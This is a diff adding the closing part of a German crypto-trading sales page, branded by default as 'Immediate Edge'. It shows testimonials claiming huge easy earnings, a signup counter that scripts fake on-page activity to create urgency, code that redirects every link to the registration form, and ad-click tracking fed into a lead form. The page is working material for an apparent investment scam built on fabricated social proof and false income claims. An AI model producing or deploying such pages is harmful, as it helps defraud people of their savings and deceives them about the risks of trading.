+            wenn man bedenkt, wie kompliziert die Welt der Kryptowährungen sein kann... aber ihr macht es so leicht,
+            unvorstellbare Summen zu verdienen!</div>
+        </div>
+      </div>
+    </div>
+    <div class="bg-white">
+      <div class="py-7 w-full max-w-8xl px-4 mx-auto">
+        <div class="flex flex-col lg:flex-row lg:items-center">
+          <div class="lg:w-1/3 mb-4 lg:mb-0 flex items-center flex-shrink-0">
+            <div class="w-16 h-16 sm:w-20 sm:h-20 mr-5 flex-shrink-0 rounded-full">
+              <img alt="" class="block w-full h-full object-cover rounded-full" src="images/user-8.webp"
+                srcset="images/user-8.webp 1x, images/user-8.webp 2x" />
+            </div>
+            <div>
+              <div class="font-black font-alt text-primary-darker truncate sm:text-lg">Sebastian Müller</div>
+              <img alt="" class="h-5" src="images/stars.svg" />
+              <div class="mt-2 flex gap-2">
+                <a
+                  class="px-2 py-0.5 inline-flex items-center border border-primary-medium rounded text-primary-medium hover:text-primary-main hover:border-primary-main active:brightness-95">
+                  <i class="icon-like mr-1"></i>Ich mag es</a>
+                <a
+                  class="px-2 py-0.5 inline-flex items-center border border-primary-medium rounded text-primary-medium hover:text-primary-main hover:border-primary-main active:brightness-95">
+                  <i class="icon-comment mr-1"></i>Kommentieren</a>
+              </div>
+            </div>
+          </div>
+          <div class="flex-grow text-primary-medium">Genau das, was ich erwartet habe! Eure informative Unterstützung
+            und das äußerst lukrative System werden mich ein Leben lang beschäftigen! Vielen Dank!</div>
+        </div>
+      </div>
+    </div>
+    <div class="bg-primary-light">
+      <div class="py-7 w-full max-w-8xl px-4 mx-auto">
+        <div class="flex flex-col lg:flex-row lg:items-center">
+          <div class="lg:w-1/3 mb-4 lg:mb-0 flex items-center flex-shrink-0">
+            <div class="w-16 h-16 sm:w-20 sm:h-20 mr-5 flex-shrink-0 rounded-full">
+              <img alt="" class="block w-full h-full object-cover rounded-full" src="images/user-9.webp"
+                srcset="images/user-9.webp 1x, images/user-9.webp 2x" />
+            </div>
+            <div>
+              <div class="font-black font-alt text-primary-darker truncate sm:text-lg">Luca Kellermann</div>
+              <img alt="" class="h-5" src="images/stars.svg" />
+              <div class="mt-2 flex gap-2">
+                <a
+                  class="px-2 py-0.5 inline-flex items-center border border-primary-medium rounded text-primary-medium hover:text-primary-main hover:border-primary-main active:brightness-95">
+                  <i class="icon-like mr-1"></i>Ich mag es</a>
+                <a
+                  class="px-2 py-0.5 inline-flex items-center border border-primary-medium rounded text-primary-medium hover:text-primary-main hover:border-primary-main active:brightness-95">
+                  <i class="icon-comment mr-1"></i>Kommentieren</a>
+              </div>
+            </div>
+          </div>
+          <div class="flex-grow text-primary-medium">Am ersten Tag habe ich über 900 Euro verdient, also kann ich mit
+            Sicherheit sagen... Endlich habe ich etwas gefunden, das großartige Ergebnisse bringt!</div>
+        </div>
+      </div>
+    </div>
+    <a class="logo flex items-center gap-3">
+      <div class="my-7 lg:my-12 w-full max-w-8xl px-4 mx-auto">
+        <div class="p-7 rounded-xl bg-primary-main text-white text-xl lg:text-2xl font-black font-alt text-center">In
+          den letzten 5 Minuten wurden <strong data-slot-count2=""> 8 </strong> Registrierte Personen.</div>
+      </div>
+    </a>
+    <div class="bg-primary-light">
+      <div class="w-full max-w-8xl lg:px-4 mx-auto flex flex-col lg:flex-row lg:items-center">
+        <div class="relative w-full pt-[56.25%] lg:pt-0 lg:w-96 lg:min-h-[454px] flex-shrink-0">
+          <img alt="" class="absolute top-0 right-0 w-full h-full object-cover lg:w-auto lg:max-w-none"
+            src="images/bottom.webp" srcset="images/bottom.webp 1x, images/bottom.webp 2x" />
+        </div>
+        <div class="px-4 lg:px-12 py-4 text-center lg:text-left">
+          <div class="text-2xl md:text-4xl font-black text-primary-darker font-alt">Überprüfen Sie Ihr Einkommen in 2
+            Wochen und lassen Sie sich überraschen!</div>
+          <div class="mt-4 text-2xl md:text-4xl font-light font-alt text-primary-medium">Verpassen Sie nicht diese
+            Gelegenheit!</div>
+        </div>
+      </div>
+    </div>
+  </main>
+  <footer class="footer pt-5 lg:pt-7 bg-primary-dark text-white">
+    <div class="w-full max-w-8xl mx-auto px-3 md:px-6">
+      <div class="flex flex-col lg:flex-row items-center justify-between">
+        <div class="flex flex-col lg:flex-row items-center">
+          <a class="logo flex items-center gap-3">
+            <img alt="" src="images/logo.svg" />
+            <div class="uppercase text-white"><span id="dynamic-brand-11"></span></div>
+          </a>
+          <span class="lg:pl-5 lg:ml-5 lg:border-l lg:border-l-white/10">Geld ganz einfach verdienen!</span>
+        </div>
+        <div
+          class="w-full md:w-auto mt-4 md:mt-0 mx-4 md:order-2 flex flex-wrap items-center justify-center gap-y-1 gap-5 lg:gap-10">
+          <a class="text-white hover:text-primary" href="html/privacy.html" target="_blank">Datenschutzerklärung</a>
+          <a class="text-white hover:text-primary" href="html/terms.html" target="_blank">Allgemeine
+            Geschäftsbedingungen</a>
+          <a class="text-white hover:text-primary" href="html/abuse_report.html" target="_blank">Missbrauch/Spam
+            melden</a>
+        </div>
+      </div>
+    </div>
+    <div class="w-full max-w-8xl mx-auto px-3 md:px-6 text-center md:text-left text-muted text-xs text-white/30">
+      <div class="my-5">WICHTIG: Hinweise zu Einnahmen und rechtlichen Aspekten Die Darstellungen von Einnahmen und
+        Gewinnen, die präsentiert werden <span id="dynamic-brand-12"></span> defini info, (Kollektiv "Diese Website")
+        werden nur als Beispiele für Ihre potenziellen Einnahmen verwendet. Die Erfolge der Personen in den Testimonials
+        und anderen Beispielen sind außergewöhnliche Ergebnisse und sollten nicht als Garantie dafür verstanden werden,
+        dass Sie oder andere dieselben Ergebnisse erzielen werden. Individuelle Ergebnisse variieren und hängen
+        vollständig von Ihrer Nutzung von immediatedefiniinfo ab. Diese Website ist nicht für Ihre Handlungen
+        verantwortlich. Sie tragen die volle Verantwortung für Ihre Handlungen und Entscheidungen bei der Nutzung der
+        Produkte und Dienstleistungen, daher sollten Sie stets mit Umsicht und Vorsicht handeln. Sie akzeptieren, dass
+        diese Website in keiner Weise für Ergebnisse verantwortlich ist, die sich aus der Nutzung unserer
+        Dienstleistungen ergeben. Bitte lesen Sie die Nutzungsbedingungen unserer Website für unseren vollständigen
+        Haftungsausschluss und andere Einschränkungen. Trading kann erhebliche Gewinne generieren, birgt aber auch das
+        Risiko eines teilweisen oder vollständigen Verlusts des investierten Kapitals. Daher sollten Sie sorgfältig
+        abwägen, ob Sie sich solche Investitionen leisten können. © 2024 HINWEIS ZUR REGULIERUNG IN DEN USA: Der Handel
+        mit Forex, CFDs und Kryptowährungen ist in den USA nicht reguliert. Investitionen in Krypto werden von keiner
+        Finanzbehörde oder US-Agentur überwacht oder reguliert. Jede nicht regulierte Handelsaktivität, die von
+        US-Bewohnern durchgeführt wird, gilt als illegal. Diese Website akzeptiert keine Kunden mit Wohnsitz in den USA
+        oder mit US-Staatsbürgerschaft. Diese Website ist nicht für die Handlungen von Kunden mit Wohnsitz in den USA
+        oder mit US-Staatsbürgerschaft verantwortlich. Solche Kunden tragen die volle Verantwortung für ihre Handlungen
+        und Entscheidungen bei der Nutzung der Produkte und Dienstleistungen dieser Website. In jedem Fall liegt die
+        Entscheidung, die Website, den Dienst und/oder die Software zu nutzen, allein beim Nutzer, der die geltenden
+        Gesetze einhalten muss.</div>
+    </div>
+    <div class="border-t border-t-white/10">
+      <div class="w-full max-w-8xl mx-auto px-3 md:px-6">
+        <div class="pt-5 flex flex-col md:flex-row items-center justify-center text-center text-sm">
+          <div class="mb-5" style="padding-bottom: 50px">Copyright © <span class="current-year-span"></span> Alle Rechte
+            vorbehalten von<a class="text-white hover:text-primary"> <span id="dynamic-brand-12"></span> </a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </footer>
+  <div id="floatingButton">
+    <a class="floatingButton">Anmelden</a>
+  </div>
+  <script>
+    (function () {
+      const fullPageHeight = document.documentElement.scrollHeight;
+      const button = document.getElementById("floatingButton");
+      window.addEventListener("scroll", () => {
+        const scrolled = window.scrollY;
+        const windowHeight = window.innerHeight;
+        const scrollPercentage = (scrolled / (fullPageHeight - windowHeight)) * 100;
+        if (scrollPercentage >= 40) {
+          button.style.display = "block";
+        } else {
+          button.style.display = "none";
+        }
+      });
+      const getRandomInt = (min, max) => {
+        min = Math.ceil(min);
+        max = Math.floor(max);
+        return Math.floor(Math.random() * (max - min + 1) + min);
+      }
+      const updateSlots = () => {
+        setTimeout(() => {
+          const slotCountEl = document.querySelector("[data-slot-count]");
+          const slotCountEl2 = document.querySelector("[data-slot-count2]");
+          if (!slotCountEl) {
+            return;
+          }
+          const currentSlots = Number(slotCountEl.textContent);
+          const currentSlots2 = Number(slotCountEl2.textContent);
+          if (currentSlots <= 2) {
+            return;
+          }
+          slotCountEl.textContent = currentSlots - 1;
+          slotCountEl2.textContent = currentSlots2 + 1;
+          updateSlots();
+        }, getRandomInt(3, 10) * 1000);
+      };
+      updateSlots();
+    })();
+  </script>
+  <script>
+    let links = document.querySelectorAll('a');
+    let form = document.querySelector('form');
+    links.forEach((el) => {
+      el.addEventListener('click', (e) => {
+        e.preventDefault();
+        form.scrollIntoView({
+          behavior: 'smooth',
+          block: 'center'
+        })
+      })
+    })
+  </script>
+  <script>
+    // Variable global para almacenar el hit ID
+    let ff_hit_id = '';
+    // Función para actualizar el valor en el formulario
+    function updateHitId(value) {
+      ff_hit_id = value || '';
+      const hitIdField = document.getElementById('intgrtn_custom2');
+      if (hitIdField) {
+        hitIdField.value = ff_hit_id;
+        console.log('Hit ID actualizado:', ff_hit_id);
+      }
+    }
+    // 1. Intentar obtener el valor de fluxView cuando esté disponible
+    document.addEventListener('fluxView', function () {
+      const fluxHitId = flux.get('{hit}');
+      console.log("Evento fluxView recibido. Hit ID:", fluxHitId);
+      updateHitId(fluxHitId);
+    });
+    // 2. Obtener parámetros de URL al cargar la página
+    document.addEventListener('DOMContentLoaded', function () {
+      const urlParams = new URLSearchParams(window.location.search);
+
+      // Actualizar hit_id desde URL si existe
+      const urlHitId = urlParams.get('intgrtn_custom2');
+      if (urlHitId) {
+        updateHitId(urlHitId);
+      }
+
+      // Configurar otros campos ocultos
+      document.getElementById('gbraid').value = urlParams.get('gbraid') || '';
+      document.getElementById('wbraid').value = urlParams.get('wbraid') || '';
+      document.getElementById('gclid').value = urlParams.get('gclid') || '';
+      document.getElementById('msclkid').value = urlParams.get('msclkid') || '';
+
+      // Asignar el parámetro 'kw' al campo 'kw' si existe
+      const kwParam = urlParams.get('kw');
+      if (kwParam) {
+        document.getElementById('kw').value = kwParam;
+      }
+
+      // Verificar se flux está disponible inmediatamente
+      if (typeof flux !== 'undefined') {
+        const immediateHitId = flux.get('{hit}');
+        if (immediateHitId) {
+          updateHitId(immediateHitId);
+        }
+      }
+    });
+    // 3. Verificación adicional al enviar el formulario
+    document.getElementById('form').addEventListener('submit', function (e) {
+      // Mostrar bloqueo de pantalla
+      document.getElementById('formLoading').style.display = 'flex';
+
+      // Deshabilitar el botón para evitar doble envío
+      const submitBtn = this.querySelector('button[type="submit"]');
+      submitBtn.disabled = true;
+
+      // Última verificación antes de enviar
+      if (!ff_hit_id && typeof flux !== 'undefined') {
+        const lastAttemptHitId = flux.get('{hit}');
+        updateHitId(lastAttemptHitId);
+      }
+      console.log('Enviando formulario con hit_id:', ff_hit_id);
+      // Opcional: puedes descomentar esto para ver todos los datos del formulario
+      // console.log('Datos del formulario:', new FormData(this));
+    });
+    // Depuración: verificar cada 5 segundos el estado (opcional, solo para desarrollo)
+    setInterval(function () {
+      console.log('Estado actual de ff_hit_id:', ff_hit_id);
+      console.log('Valor en campo intgrtn_custom2:', document.getElementById('intgrtn_custom2').value);
+    }, 5000);
+  </script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const phoneInput = document.getElementById('phone');
+
+      phoneInput.addEventListener('input', function () {
+        this.value = this.value.replace(/\D/g, ''); // elimina todo lo que no sea dígito
+      });
+    });
+  </script>
+  <script src="geos.js"></script>
+  <script>
+    // Lógica de reemplazo de marca por parámetro kw y país por parámetro geo
+    document.addEventListener('DOMContentLoaded', function () {
+      const urlParams = new URLSearchParams(window.location.search);
+
+      // 1. Manejar marca (kw) - SIN validación de seguridad (utm_campaign) en esta página
+      let requestedKW = urlParams.get('kw');
+      const defaultBrand = 'Immediate Edge';
+
+      const hasBraces = (str) => str && (str.includes('{') || str.includes('}'));
+
+      // Logic: Use dynamic kw if valid and safe.
+      if (requestedKW && requestedKW.trim() !== '' && !hasBraces(requestedKW)) {
+        requestedKW = requestedKW.replace(/-/g, ' ')
+          .replace(/\b\w/g, l => l.toUpperCase());
+      } else {
+        requestedKW = defaultBrand;
+      }
+
+      document.querySelectorAll('[id^="dynamic-brand"], .dynamic-brand').forEach(el => {
+        el.textContent = requestedKW;
+      });
+
+      // 2. Manejar país (geo)
+      const requestedGeo = urlParams.get('geo') || DEFAULT_GEO;
+      const countryName = getCountryName(requestedGeo);
+      document.querySelectorAll('[id^="dynamic-country"], .dynamic-country').forEach(el => {
+        el.textContent = countryName;
+      });
+
+      // Update Current Year
+      const year = new Date().getFullYear();
+      document.querySelectorAll('.current-year-span').forEach(el => {
+        el.textContent = year;
+      });
+    });
+  </script>
+
+  <div class="form-disabled" id="formLoading" style="display: none;">Daten werden verifiziert... Bitte schließen Sie
+    dieses Fenster nicht.</div>
+  <script>
+    // Auto-fill email logic
+    document.addEventListener('DOMContentLoaded', function () {
+      const urlParams = new URLSearchParams(window.location.search);
+      const emailParam = urlParams.get('email');
+      if (emailParam) {
+        const emailField = document.getElementById('email-field');
+        if (emailField) {
+          emailField.value = emailParam;
+          // Visual cue: Add visual feedback and focus
+          emailField.classList.add('bg-green-50');
+          emailField.style.backgroundColor = "#f0fdf4"; // Fallback inline
+          emailField.style.borderColor = "#22c55e";
+        }
+      }
+    });
+  </script>
+</body>
+
+</html>
